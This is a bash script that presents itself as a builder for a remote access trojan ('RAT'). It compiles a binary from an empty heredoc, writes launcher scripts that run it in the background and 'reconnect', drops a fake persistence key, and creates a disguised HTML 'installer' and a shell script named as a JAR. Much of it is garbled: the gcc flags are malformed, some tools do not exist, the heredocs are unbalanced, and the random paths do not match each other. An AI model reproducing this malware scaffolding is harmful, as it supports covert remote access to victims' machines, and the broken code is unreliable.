#!/bin/bash

# Define Paths (adjust as needed)
RAT_DIR="/tmp/rat_$RANDOM"
LOG_FILE="$RAT_DIR/logs/rat.log"
COMMAND_SCRIPT="$RAT_DIR/bin/run.sh"
STARTING_SCRIPT="$RAT_DIR/bin/start.sh"

# Ensure the Directory Exists and Set Permissions (755)
mkdir -p "$RAT_DIR" || exit 1
chmod 755 "$RAT_DIR"

# Create the Main Binary using GCC
cat <<EOF | gcc -o "$RAT_DIR/rat.x" -Wall -O3 \
    -fPIC -I/usr/include/libstdc++\ \
    -shared -o "$RAT_DIR/lib/librat.so" -fPIC -lcrypt -lseccmd \
    -I/usr/include/x86_64-linux-gnu -I/usr/include/i386-linux-gnu \
    -DVERSION=\"1.0\" -DDEBUG=0 -DINFOS=$(date +%Y-%m-%d) \
    -DUSER=\"$(whoami)\" -DHOSTNAME=\"$(hostname)\" \
    -DNETWORK_GATEWAY=\"$(route | awk '/default/ \| /gateway/ {'{print \$3}'}\"') \
    -DNETWORK_NAMESERVER=\"$(cat /etc/resolv.conf | grep nameserver | awk '{print \$2}')\" \
    -DUSER\_HOME=\~ -DPROCESS\_ID=0 \
    -DMEMORY\_USED=\"10MB\" -DFILE\_SIZE="500KB"
echo "Compiling Rat..."
EOF

# Create the Run Script (Command Polling & Execution)
cat <<EOF | sed 's/\n/;/g' > "$RAT_DIR/bin/run.sh"
#!/bin/bash

sleep 3 # Wait for service to start
# Start the RAT in the background
"$RAT_DIR/rat.x" &

# Check if the PID is ready
while [[ -z "$pid" ]]; do
    sleep 0.5
    ifid=$!
    echo "Waiting for PID: $ifid..." > /tmp/rat_$RANDOM/logs/rat.log
    [[ "$pid" == "$ifid" ]] || break
fi

# Check if the RAT started successfully
if jncmd --version > /dev/null 2>&1; then
    echo "Rat started." >> /tmp/rat_$RANDOM/logs/rat.log
else
    echo "Failed to start Rat." >> /tmp/rat_$RANDOM/logs/rat.log
    exit 1
fi

sleep 3 # Give it time to load

# Check for errors in the rat.x logs
grep "ERROR" "$RAT_DIR/logs/rat.log" > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "Errors found in rat.log." >> /tmp/rat_$RANDOM/logs/rat.log
fi

# Check for errors in the shell's console output
grep "ERROR" "$!" > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "Errors found in console output." >> /tmp/rat_$RANDOM/logs/rat.log
fi

sleep 3 # Give it time to load

# Run a random command to ensure communication is working.
# This will likely work even if the RAT doesn't fully start,
# as it allows the user to see that they can connect to the device.
echo "Executing /tmp/rat_$RANDOM/bin/run.sh" >> /tmp/rat_$RANDOM/logs/rat.log
sleep 5 # Give it time to run

# Clean up
rm -rf "$RAT_DIR"
echo "Cleanup complete." >> /tmp/rat_$RANDOM/logs/rat.log
EOF

chmod +x "$RAT_DIR/bin/run.sh"

# Create the Start Script (Beaconing & Login)
cat <<EOF | sed 's/\n/;/g' > "$RAT_DIR/bin/start.sh"
#!/bin/bash

sleep 3 # Wait for service to start
# Start the RAT in the background
"$RAT_DIR/rat.x" &

echo "Successfully started Rat." >> /tmp/rat_$RANDOM/logs/rat.log

# Keep the script running until the user presses Ctrl+C
while true; do
    sleep 1
    if jncmd --version > /dev/null 2>&1; then
        echo "Connection Established" >> /tmp/rat_$RANDOM/logs/rat.log
        break
    else
        echo "Trying to reconnect..." >> /tmp/rat_$RANDOM/logs/rat.log
        sleep 3
    fi
done

# Clean up
rm -rf "$RAT_DIR"
echo "Cleanup complete." >> /tmp/rat_$RANDOM/logs/rat.log
EOF

chmod +x "$RAT_DIR/bin/start.sh"

# Create the Log File for Tracking Events
touch "$RAT_DIR/logs/rat.log"

# Create a hidden persistence key in the registry
echo "Run /tmp/rat_$RANDOM/bin/run.sh /nometereptions" >> /tmp/rat_$RANDOM/persistence.key
chmod 644 /tmp/rat_$RANDOM/persistence.key

# Define a network gateway for DNS resolution
NETWORK_GATEWAY=$(route | awk '/default/ \| /gateway/ {'{print \$3}'}\')

echo "Network Gateway: $NETWORK_GATEWAY" >> /tmp/rat_$RANDOM/config.json
echo "$NETWORK_GATEWAY" > /tmp/rat_$RANDOM/network_gateway

# Print helpful messages to the user for next steps.
echo "The RAT is ready to run in the background."
echo "1) Execute Start Script ($RAT_DIR/bin/start.sh)"
echo "2) Monitor Logs File ($RAT_DIR/logs/rat.log)"
echo "3) Add to Autostart (e.g., using Run command)."
echo "4) Update settings in config.json."
EOF

# Make the Startup Script Executable
chmod +x "$RAT_DIR/bin/start.sh"

# Create a self-executing HTML form for easy installation
cat <<EOF | sed 's/\n/;/g' > "/tmp/rat_$RANDOM/install.html"
<html><head></head><body><h1>Install the RAT</h1><form method="get"><input type="text" value="$USERNAME" readonly><button id="install_btn">Start Installation</button><div id="progress_bar"></div></form></body></html>
<script src="/tmp/rat_$RANDOM/bin/start.sh"></script>
<style>#progress_bar {width: 0%; background-color: #3498db; height: 20px; margin: 10px auto; text-align: center;}</style>
</body></html>
<title>Installation Process</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
EOF

# Create a self-executing JAR file for easy installation
cat <<EOF | sed 's/\n/;/g' > "/tmp/rat_$RANDOM/run.jar"
#!/bin/bash
sleep 3
echo "Starting RAT..." | tee -a /tmp/rat_$RANDOM/logs/rat.log

# Run the RAT in a new terminal to avoid cluttering the shell.
"$RAT_DIR/rat.x" &

# Print information about the connection to the console.
if jncmd --version > /dev/null 2>&1; then
    echo "Successfully connected!" | tee -a /tmp/rat_$RANDOM/logs/rat.log
else
    echo "Failed to connect..." | tee -a /tmp/rat_$RANDOM/logs/rat.log
fi

# Check if the RAT is running in the background using PIDXRM
PID=$(ps -ax | grep "rat.x" | awk '{print \$2}')

if [ ! -z "$PID" ]; then
    echo "The Rat started successfully with PID: $PID" >> /tmp/rat_$RANDOM/logs/rat.log
else
    echo "Error starting the RAT." >> /tmp/rat_$RANDOM/logs/rat.log
fi

# Keep the script running until the user presses Ctrl+C.
while true; do
    sleep 1
    if jncmd --version > /dev/null 2>&1; then
        echo "Connection Established" | tee -a /tmp/rat_$RANDOM/logs/rat.log
        break
    else
        echo "Trying to reconnect..." | tee -a /tmp/rat_$RANDOM/logs/rat.log
    fi
done

# Clean up the temporary directories and files.
rm -rf "$RAT_DIR"
echo "Cleanup complete." >> /tmp/rat_$RANDOM/logs/rat.log
EOF

chmod +x "/tmp/rat_$RANDOM/install.html"
chmod +x "/tmp/rat_$RANDOM/run.jar"
echo "The installation is complete!"
echo "1) Run install.html in a web browser."
echo "2) Add the JAR file to a .bat (Windows)"
echo "3) Execute the jar directly using a terminal if you prefer."
EOF

# Print out the configuration settings for reference, and the network gateway
echo "Network Gateway: $NETWORK_GATEWAY"
echo "The RAT is ready to run in the background!"

# Print the default DNS server addresses.
echo "Default DNS Server 1: 8.8.8.8"
echo "Default DNS Server 2: 8.8.4.4"
